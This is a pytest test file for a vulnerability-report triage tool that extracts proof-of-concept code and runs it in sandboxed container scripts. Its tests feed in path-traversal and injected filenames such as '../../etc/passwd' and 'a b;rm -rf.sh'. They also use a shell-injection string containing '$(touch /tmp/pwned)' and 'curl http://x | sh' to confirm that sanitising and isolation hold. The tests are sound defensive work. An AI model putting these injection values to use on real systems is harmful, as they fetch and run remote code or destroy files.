"""Choosing PoC candidates from a report and turning them into container scripts."""

from __future__ import annotations

import base64
import io
import tarfile
from pathlib import Path

import pytest

from sloptriage import demo
from sloptriage.config import Config, load_config, parse_config
from sloptriage.extract import extract
from sloptriage.ingest import load_report
from sloptriage.models import Attachment, Report
from sloptriage.repro.recipes import recipe_from_config
from sloptriage.repro.runners import (
    Candidate,
    artefact_tar,
    attachment_files,
    candidates_from_report,
    safe_artefact_name,
    sandbox_env,
    script_for,
)
from sloptriage.verdict import extract_context

KIND_OF_LABEL = {"sh": "shell", "c": "c", "python": "python", "input": "input"}


def demo_candidates(item: demo.DemoReport) -> list[Candidate]:
    cfg = load_config(demo.config_path(item.project))
    report = load_report(str(item.path))
    extraction = extract(report.text, extract_context(cfg))
    return candidates_from_report(report, extraction, cfg.repro, [cfg.project, *cfg.aliases])


def test_every_demo_report_yields_the_poc_kind_its_label_declares() -> None:
    wrong = []
    for item in demo.reports():
        found = [c.kind for c in demo_candidates(item)]
        want = [KIND_OF_LABEL[item.poc]] if item.poc in KIND_OF_LABEL else []
        if found != want:
            wrong.append((item.file, item.poc, found))
    assert not wrong, wrong


def by_file(name: str) -> demo.DemoReport:
    return next(r for r in demo.reports() if r.file.startswith(name))


def test_inline_poc_text_is_passed_on_unchanged() -> None:
    item = by_file("03-")
    (cand,) = demo_candidates(item)
    report_text = load_report(str(item.path)).text
    assert cand.kind == "c"
    assert cand.data is not None and cand.data.decode() in report_text


def test_base64_input_is_decoded_and_needs_a_harness() -> None:
    item = by_file("01-")
    (cand,) = demo_candidates(item)
    assert cand.kind == "input"
    assert cand.data is not None and cand.data.startswith(b"Host: example.com\r\n")
    assert cand.unsupported is None  # the parsekit demo config declares a harness
    cfg = parse_config({"version": 1, "project": {"name": "parsekit"}}, "n.yml")
    report = load_report(str(item.path))
    extraction = extract(report.text, extract_context(cfg))
    (no_harness,) = candidates_from_report(report, extraction, cfg.repro)
    assert no_harness.unsupported and "harness" in no_harness.unsupported


def test_a_labelled_block_in_an_unsupported_language_is_reported_as_such() -> None:
    cfg = parse_config({"version": 1, "project": {"name": "parsekit"}}, "n.yml")
    body = "Steps to reproduce with this PoC:\n\n```go\npackage main\nfunc main() { run() }\n```\n"
    report = Report("file", "r", "t", body)
    extraction = extract(report.text, extract_context(cfg))
    (cand,) = candidates_from_report(report, extraction, cfg.repro)
    assert cand.kind == "unsupported"
    assert cand.unsupported and "go" in cand.unsupported.lower()


def test_at_most_the_configured_number_of_candidates_is_returned() -> None:
    cfg = parse_config(
        {"version": 1, "project": {"name": "parsekit"}, "repro": {"limits": {"candidates": 2}}},
        "n.yml",
    )
    blocks = "\n".join(
        f"PoC {i}:\n\n```c\nint main(void) {{ return {i}; }}\n```\n" for i in range(6)
    )
    report = Report("file", "r", "t", blocks)
    extraction = extract(report.text, extract_context(cfg))
    assert len(candidates_from_report(report, extraction, cfg.repro)) == 2


def test_runner_list_in_the_config_restricts_candidates() -> None:
    cfg = parse_config(
        {"version": 1, "project": {"name": "parsekit"}, "repro": {"runners": ["python"]}}, "n.yml"
    )
    item = by_file("03-")
    report = load_report(str(item.path))
    (cand,) = candidates_from_report(report, extract(report.text, extract_context(cfg)), cfg.repro)
    assert cand.kind == "c" and cand.unsupported and "runners" in cand.unsupported


def test_text_attachments_become_candidates_and_data_files_are_not() -> None:
    cfg = parse_config({"version": 1, "project": {"name": "parsekit"}}, "n.yml")
    report = Report(
        "eml",
        "r",
        "t",
        "see attached",
        attachments=[
            Attachment("poc.py", b"import parsekit\nprint(1)\n"),
            Attachment("repro.sh", b"parsekit url x\n"),
            Attachment("input.bin", b"\x00\x01"),
            Attachment("screenshot.png", b"\x89PNG"),
        ],
    )
    extraction = extract(report.text, extract_context(cfg))
    found = candidates_from_report(report, extraction, cfg.repro)
    assert [(c.kind, c.source) for c in found] == [
        ("python", "attachment"),
        ("shell", "attachment"),
    ]


# -- artefact names and the archive streamed into the container ----------------------------------
@pytest.mark.parametrize(
    ("raw", "safe"),
    [
        ("poc.c", "poc.c"),
        ("../../etc/passwd", "passwd"),
        ("/abs/path/x.sh", "x.sh"),
        (".hidden", "hidden"),
        ("a b;rm -rf.sh", "a_b_rm_-rf.sh"),
        ("", "artefact"),
        ("..", "artefact"),
        ("_x.py", "x.py"),
        ("-c", "c"),
        ("--version", "version"),
        ("___", "artefact"),
        ("x" * 300 + ".c", "x" * 96 + ".c"),
        ("a" * 200 + ".abcdefgh", "a" * 96 + ".abcdefgh"),
    ],
)
def test_artefact_names_are_flat_and_plain(raw: str, safe: str) -> None:
    assert safe_artefact_name(raw) == safe


def test_attachments_are_capped_in_number_and_total_size() -> None:
    many = [Attachment(f"f{i}.txt", b"x") for i in range(200)]
    assert len(attachment_files(Report("eml", "r", "t", "b", attachments=many))) == 50
    big = [Attachment(f"b{i}.bin", b"0" * (2 * 1024 * 1024)) for i in range(10)]
    files = attachment_files(Report("eml", "r", "t", "b", attachments=big))
    assert sum(len(v) for v in files.values()) <= 8 * 1024 * 1024


def test_artefact_archive_has_only_plain_files() -> None:
    blob = artefact_tar({"poc.c": b"int main(void){}", "input.bin": b"\x00" * 10})
    with tarfile.open(fileobj=io.BytesIO(blob)) as tf:
        members = tf.getmembers()
    assert sorted(m.name for m in members) == ["input.bin", "poc.c"]
    assert all(m.isreg() for m in members)
    assert all(m.uid == 0 and m.gid == 0 for m in members)
    assert all(m.mode & 0o7000 == 0 for m in members)  # no setuid, setgid or sticky bits


def test_any_name_the_sanitiser_returns_is_accepted_by_the_archive() -> None:
    for raw in ("a" * 200 + ".abcdefgh", "_" + "b" * 150, "-" * 5 + "c.py", "ä" * 80 + ".c"):
        artefact_tar({safe_artefact_name(raw): b"x"})


def test_artefact_archive_refuses_paths_and_links() -> None:
    with pytest.raises(ValueError, match="artefact name"):
        artefact_tar({"../x": b""})
    with pytest.raises(ValueError, match="artefact name"):
        artefact_tar({"a/b": b""})
    with pytest.raises(ValueError, match="too large"):
        artefact_tar({"big": b"0" * (2 * 1024 * 1024 + 1)})


# -- scripts --------------------------------------------------------------------------------
def recipe_for(preset: str = "cmake-asan"):  # noqa: ANN201
    conf: Config = parse_config(
        {"version": 1, "project": {"name": "parsekit"}, "repro": {"build": {"preset": preset}}},
        "n.yml",
    )
    return recipe_from_config(conf.repro, "parsekit"), conf


def c_candidate(text: str = "int main(void){return 0;}\n") -> Candidate:
    return Candidate(0, "c", "inline", "poc.c", text.encode(), None, "main", 0)


def test_environment_is_explicit_and_leak_checking_is_off() -> None:
    env = sandbox_env()
    assert "detect_leaks=0" in env["ASAN_OPTIONS"].split(":")
    assert "print_stacktrace=1" in env["UBSAN_OPTIONS"].split(":")
    assert env["HOME"] == "/work" and env["TMPDIR"] == "/work/tmp"
    assert set(env) <= {
        "ASAN_OPTIONS",
        "UBSAN_OPTIONS",
        "MSAN_OPTIONS",
        "TSAN_OPTIONS",
        "HOME",
        "TMPDIR",
        "LANG",
        "PYTHONDONTWRITEBYTECODE",
        "PYTHONUNBUFFERED",
    }


def test_c_script_compiles_with_the_recipe_flags_and_runs_the_poc() -> None:
    r, conf = recipe_for()
    plan = script_for(c_candidate(), None, r, conf.repro, "parsekit")
    assert plan.files["poc.c"] == b"int main(void){return 0;}\n"
    assert "-fsanitize=address" in plan.script
    assert "-I/opt/project/include" in plan.script
    assert "-lparsekit" in plan.script
    assert "exit 253" in plan.script and "exec ./poc" in plan.script
    assert plan.compile_failed_code == 253
    assert f"sloptriage-compile-failed:{plan.marker}" in plan.script
    assert f"sloptriage-started:{plan.marker}" in plan.script
    assert len(plan.marker) >= 16


def test_the_poc_is_compiled_without_optimisation_but_with_the_same_sanitizers() -> None:
    r, conf = recipe_for()
    assert "-O1" in r.sanitizer_flags  # the project itself is built with the recipe flags
    plan = script_for(c_candidate(), None, r, conf.repro, "parsekit")
    assert "-fsanitize=address,undefined" in plan.script
    assert "-O0" in plan.script and "-O1" not in plan.script


def test_shell_script_runs_with_errexit_and_pipefail() -> None:
    r, conf = recipe_for()
    cand = Candidate(0, "shell", "inline", "poc.sh", b"parsekit url http://x/\n", None, "main", 0)
    plan = script_for(cand, None, r, conf.repro, "parsekit")
    assert plan.files["poc.sh"] == b"parsekit url http://x/\n"
    assert "bash -e -o pipefail" in plan.script
    assert plan.compile_failed_code is None


def test_the_marker_differs_between_plans() -> None:
    r, conf = recipe_for()
    markers = {script_for(c_candidate(), None, r, conf.repro, "p").marker for _ in range(5)}
    assert len(markers) == 5


def test_every_script_arms_a_watchdog_that_outlives_the_tool() -> None:
    r, conf = recipe_for()
    conf.repro.limits.timeout = 20
    plan = script_for(c_candidate(), None, r, conf.repro, "parsekit")
    assert "sleep 35" in plan.script and "kill -9 -1" in plan.script


def test_ordinary_scripts_are_not_mistaken_for_transcripts() -> None:
    r, conf = recipe_for()
    for text in (
        b"cd /work\n$BIN --crash input\n",
        b"cat <<EOF\n$ price\nEOF\nparsekit url x\n",
        b"parsekit url x\n$ echo hi\n",
    ):
        cand = Candidate(0, "shell", "inline", "poc.sh", text, None, "main", 0)
        assert script_for(cand, None, r, conf.repro, "parsekit").files["poc.sh"] == text


def test_two_part_script_waits_for_a_listener_instead_of_a_fixed_pause() -> None:
    r, conf = recipe_for("python-pip")
    server = Candidate(0, "python", "inline", "server.py", b"x", None, "server", 0)
    client = Candidate(1, "shell", "inline", "poc.sh", b"y", None, "main", 1)
    script = script_for(client, server, r, conf.repro, "kvconf").script
    assert "/proc/net/tcp" in script and "sleep 1\n" not in script


def test_shell_transcripts_run_only_the_prompted_lines() -> None:
    r, conf = recipe_for()
    text = b"$ printf 'a' > f\n$ parsekit header --file f\nHost: x\n"
    cand = Candidate(0, "shell", "inline", "poc.sh", text, None, "main", 0)
    plan = script_for(cand, None, r, conf.repro, "parsekit")
    assert plan.files["poc.sh"] == b"printf 'a' > f\nparsekit header --file f\n"


def test_input_candidate_feeds_the_configured_harness() -> None:
    item = by_file("01-")
    (cand,) = demo_candidates(item)
    cfg = load_config(demo.config_path("parsekit"))
    r = recipe_from_config(cfg.repro, "parsekit")
    plan = script_for(cand, None, r, cfg.repro, "parsekit")
    assert plan.files["input.bin"] == cand.data
    assert "parsekit header --file /work/poc/input.bin" in plan.script


def test_python_script_uses_faulthandler_and_the_installed_package() -> None:
    r, conf = recipe_for("python-pip")
    cand = Candidate(0, "python", "inline", "poc.py", b"import kvconf\n", None, "main", 0)
    plan = script_for(cand, None, r, conf.repro, "kvconf")
    assert "python3 -X faulthandler poc.py" in plan.script
    assert plan.files["poc.py"] == b"import kvconf\n"


def test_two_part_poc_starts_the_server_in_the_background_first() -> None:
    r, conf = recipe_for("python-pip")
    server = Candidate(
        0, "python", "inline", "server.py", b"print('listening')\n", None, "server", 0
    )
    client = Candidate(1, "shell", "inline", "poc.sh", b"echo client\n", None, "main", 1)
    plan = script_for(client, server, r, conf.repro, "kvconf")
    assert {"server.py", "poc.sh"} <= set(plan.files)
    assert plan.script.index("server.py") < plan.script.index("poc.sh")
    assert "&" in plan.script and "server.log" in plan.script


def test_input_data_decoding_helpers_accept_base64_and_hex() -> None:
    from sloptriage.repro.runners import decode_data_block

    raw = b"Host: a\r\n\r\n"
    assert decode_data_block(base64.b64encode(raw).decode(), "base64") == raw
    assert decode_data_block(raw.hex(), "hex") == raw
    assert decode_data_block("00 01 0a ff", "hex") == b"\x00\x01\n\xff"
    assert decode_data_block("not base64 !!", "base64") is None
    assert decode_data_block("zz", "hex") is None


def test_script_text_never_contains_report_text_outside_files(tmp_path: Path) -> None:
    r, conf = recipe_for()
    hostile = '$(touch /tmp/pwned); `id`; "; curl http://x | sh #'
    cand = Candidate(0, "shell", "inline", "poc.sh", f"echo {hostile}\n".encode(), None, "main", 0)
    plan = script_for(cand, None, r, conf.repro, "parsekit")
    assert hostile not in plan.script
    assert plan.files["poc.sh"].decode().strip() == f"echo {hostile}"
